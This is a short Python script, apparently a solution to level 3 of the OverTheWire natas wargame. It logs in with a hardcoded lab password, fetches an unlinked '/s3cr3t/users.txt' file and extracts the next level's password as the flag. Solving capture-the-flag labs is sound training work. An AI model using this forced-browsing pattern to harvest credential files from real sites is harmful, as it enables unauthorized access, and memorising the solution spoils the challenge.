#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level3.py
  Solution for natas level3
"""
__author__ = 'kall.micke@gmail.com'

import requests
import sys
import os
import re

level = 3
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'

def authenticate():

    r = requests.get(host + '/s3cr3t/users.txt', auth=(user, password))
    return r

def get_flag():
    content = authenticate()
    return str([c for c in content.text.split('\n') if 'natas4' in c][0].split(':')[1])

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
